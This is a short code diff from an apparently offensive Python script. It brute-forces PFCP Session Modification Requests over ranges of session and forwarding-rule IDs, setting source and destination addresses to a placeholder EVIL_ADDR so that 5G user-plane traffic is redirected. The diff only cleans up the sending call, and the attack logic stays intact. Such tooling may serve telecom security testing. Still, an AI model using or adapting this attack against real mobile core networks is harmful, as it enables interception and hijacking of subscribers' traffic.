@@ -195,7 +195,7 @@ PFCPToolkit_obj = PFCPToolkit(
 )
 for seid in range(1,10):
     for farid in range(1,100):
-        modif_req = PFCPToolkit_obj.Send_PFCP_session_modification_req(
+        PFCPToolkit_obj.Send_PFCP_session_modification_req(
             seid=seid,
             far_id=farid,
             src_addr=EVIL_ADDR,
@@ -206,8 +206,7 @@ for seid in range(1,10):
             tdest_addr=EVIL_ADDR
             
         )
-        send(modif_req)
-
+        
 print ("PFCP Session Modification Request sent")
        
     
